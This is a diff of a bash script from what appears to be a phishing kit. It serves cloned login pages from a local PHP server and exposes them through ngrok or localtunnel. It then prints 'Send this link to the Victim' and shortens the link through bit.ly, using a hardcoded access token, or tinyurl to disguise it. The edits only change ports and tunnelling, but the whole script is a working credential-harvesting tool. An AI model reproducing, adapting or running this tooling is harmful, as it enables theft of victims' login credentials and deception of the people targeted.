@@ -399,13 +399,13 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd sites/$server && php -S localhost:8080 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
+./ngrok http 8080  > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://localhost:4040/api/tunnels | grep -o "https://[-.0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
 api=https://api-ssl.bitly.com/v4/shorten
@@ -427,14 +427,13 @@ rm -rf sites/$server/usernames.txt
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+cd sites/$server && php -S localhost:8080 > /dev/null 2>&1 & 
 sleep 2
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 8
-lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
-sleep 4
+lt --port 8080 --subdomain wmw-$server-com > /dev/null 2>&1 &
+sleep 5
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
 short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
@@ -467,4 +466,5 @@ rm -rf .gitignore
 rm -rf .nojekyll
 banner
 menu
+
 
